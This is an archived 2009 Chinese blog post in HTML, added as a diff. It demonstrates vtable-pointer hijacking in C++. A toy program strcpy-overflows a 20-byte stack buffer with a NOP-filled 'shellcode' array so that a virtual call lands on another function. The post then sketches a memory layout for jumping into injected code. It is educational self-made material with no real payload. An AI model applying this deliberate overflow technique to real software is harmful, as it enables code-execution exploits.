@@ -1,0 +1,281 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>攻击虚函数（意思一下） - hplonline</title>
+  <meta name="author" content="hplonline">
+
+  
+  <meta name="description" content="(hplonline)2009.7.21
+完全就是意思一下，
+看起来有点假啊。。。
+自己造个东西自己来玩。。
+原理在上一篇的虚函数的底层机制
+于是就可以通过改写虚函数表指针来达到执行其他代码的目的。
+下面的shellcode先占够了24个位置，
+然后在程序里面， &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hupili.github.io/backup-hplonline/blog/2009/07/21/%E6%94%BB%E5%87%BB%E8%99%9A%E5%87%BD%E6%95%B0%EF%BC%88%E6%84%8F%E6%80%9D%E4%B8%80%E4%B8%8B%EF%BC%89">
+  <link href="/backup-hplonline/favicon.png" rel="icon">
+  <link href="/backup-hplonline/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/backup-hplonline/atom.xml" rel="alternate" title="hplonline" type="application/atom+xml">
+  <script src="/backup-hplonline/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/backup-hplonline/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/backup-hplonline/">hplonline</a></h1>
+  
+    <h2>backup from 2006 to 2012 (original hi.baidu.com/hplonline/)</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/backup-hplonline/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hupili.github.io/backup-hplonline" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/backup-hplonline/">Blog</a></li>
+  <li><a href="/backup-hplonline/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">攻击虚函数（意思一下）</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2009-07-21T16:44:00+08:00" pubdate data-updated="true">Jul 21<span>st</span>, 2009</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>(hplonline)2009.7.21<br/><br/>
+完全就是意思一下<img src="http://img.baidu.com/hi/jx/j_0016.gif"/>，<br/>
+看起来有点假啊。。。<br/>
+自己造个东西自己来玩。。<br/><br/>
+原理在上一篇的<a href="http://hi.baidu.com/hplonline/blog/item/1bacf81f75e4026af724e485.html" target="_blank">虚函数的底层机制</a><br/><br/>
+于是就可以通过改写虚函数表指针来达到执行其他代码的目的。<font color="#0000ff"><br/></font><br/>
+下面的shellcode先占够了24个位置，<br/>
+然后在程序里面，我们把20开始的双字设置成新的虚函数表的地址。<br/>
+因为表项只有1个，所以就用一个int型的变量来假装个表了。<br/><font color="#0000ff"><br/>
+程序：</font><br/><br/></p>
+
+<h1>include &lt;iostream&gt;<br/><br/></h1>
+
+<p>using namespace std ; <br/><br/>
+char shellcode[] = {<br/>
+0x90 , 0x90 , 0x90 , 0x90 , <br/>
+0x90 , 0x90 , 0x90 , 0x90 , <br/>
+0x90 , 0x90 , 0x90 , 0x90 , <br/>
+0x90 , 0x90 , 0x90 , 0x90 , <br/>
+0x90 , 0x90 , 0x90 , 0x90 , <br/>
+0x90 , 0x90 , 0x90 , 0x90 , <br/>
+0x00<br/>
+} ; <br/><br/>
+class mycls{<br/>
+public:<br/>
+     int other_member ;<br/>
+     virtual fun(char <em>s){<br/>
+          cout&lt;&lt;&#8221;I&#8217;m fun&#8221;&lt;&lt;endl ;<br/>
+          cout&lt;&lt;s&lt;&lt;endl ;<br/>
+     }<br/>
+} ;<br/><br/>
+void f(){<br/>
+     cout&lt;&lt;&#8221;I&#8217;m f&#8221;&lt;&lt;endl ;<br/>
+}<br/><br/>
+int main(){<br/>
+     mycls c ;<br/>
+     char buf[20] ;<br/>
+     mycls </em>p ;<br/>
+     int pf ;<br/>
+     pf = (int)f ;//<em>(int</em>)<em>(int</em>)&amp;c ;<br/>
+     <em>(int</em>)(shellcode + 20) = (int)&amp;pf ;<br/>
+     shellcode[24] = 0 ;<br/>
+     strcpy(buf , shellcode) ;<br/>
+     p = &amp;c ;<br/>
+     p-&gt;fun(buf) ;<br/>
+     return 0 ;<br/>
+}<br/><br/>
+结果：<br/><br/>
+I&#8217;m f<br/>
+（外加一个报错框）<br/><br/><font color="#0000ff">实际上的安排：</font><br/><br/>
+上面借助了其他一些地方，而实际上整个内存可以这么安排：<br/><br/>
+&lt;shellcode + 4&gt;&lt;nop&gt;&lt;nop&gt;&lt;nop&gt;&#8230;&#8230;&lt;nop&gt;&lt;real code&gt;&lt;nop&gt;&#8230;&lt;nop&gt;&lt;shellcode&gt;<br/><br/>
+shellcode只开始的地址。于是最后一个&lt;shellcode&gt;作为数据淹没虚函数表的地址。<br/>
+执行的时候，会把shellcode开始的地方当作是虚函数表。<br/>
+然后查这个表的第一项，得到 shellcode+4 ， <br/>
+把这个作为虚函数的实际地址调用，然后就进入到真正的代码段里面了。<br/><br/></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">hplonline</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2009-07-21T16:44:00+08:00" pubdate data-updated="true">Jul 21<span>st</span>, 2009</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/backup-hplonline/blog/categories/tech/'>tech</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hupili.github.io/backup-hplonline/blog/2009/07/21/%E6%94%BB%E5%87%BB%E8%99%9A%E5%87%BD%E6%95%B0%EF%BC%88%E6%84%8F%E6%80%9D%E4%B8%80%E4%B8%8B%EF%BC%89/" data-via="" data-counturl="http://hupili.github.io/backup-hplonline/blog/2009/07/21/%E6%94%BB%E5%87%BB%E8%99%9A%E5%87%BD%E6%95%B0%EF%BC%88%E6%84%8F%E6%80%9D%E4%B8%80%E4%B8%8B%EF%BC%89/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/backup-hplonline/blog/2009/07/21/%E8%99%9A%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%95%E5%B1%82%E6%9C%BA%E5%88%B6/" title="Previous Post: 虚函数的底层机制">&laquo; 虚函数的底层机制</a>
+      
+      
+        <a class="basic-alignment right" href="/backup-hplonline/blog/2009/07/23/%E4%B8%80%E4%B8%AA%E7%BA%BF%E6%80%A7%E7%AD%9B%E7%B4%A0%E6%95%B0%E7%9A%84%E5%9B%BE%E5%BD%A2%E6%BC%94%E7%A4%BA%28matlab%29/" title="Next Post: 一个线性筛素数的图形演示(matlab)">一个线性筛素数的图形演示(matlab) &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/backup-hplonline/blog/2013/05/04/test/">Test</a>
+      </li>
+    
+      <li class="post">
+        <a href="/backup-hplonline/blog/2011/04/09/%E5%86%8D%E8%B0%88stl%E7%9A%84rotate/">再谈stl的rotate</a>
+      </li>
+    
+      <li class="post">
+        <a href="/backup-hplonline/blog/2011/02/01/%5Bpaper%5DXORsinTheAir%3APracticalWirelessNetworkCoding%EF%BC%88%E7%BF%BB%E8%AF%91%E3%80%81%E4%BA%8C%EF%BC%89/">[paper] XORs in The Air: Practical Wireless Network Coding（翻译、二）</a>
+      </li>
+    
+      <li class="post">
+        <a href="/backup-hplonline/blog/2011/02/01/%5Bpaper%5DXORsinTheAir%3APracticalWirelessNetworkCoding%EF%BC%88%E7%BF%BB%E8%AF%91%E3%80%81%E4%B8%89%EF%BC%89/">[paper] XORs in The Air: Practical Wireless Network Coding（翻译、三）</a>
+      </li>
+    
+      <li class="post">
+        <a href="/backup-hplonline/blog/2011/02/01/%5Bpaper%5DXORsinTheAir%3APracticalWirelessNetworkCoding%EF%BC%88%E7%BF%BB%E8%AF%91%E3%80%81%E4%B8%80%EF%BC%89/">[paper] XORs in The Air: Practical Wireless Network Coding（翻译、一）</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - hplonline -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
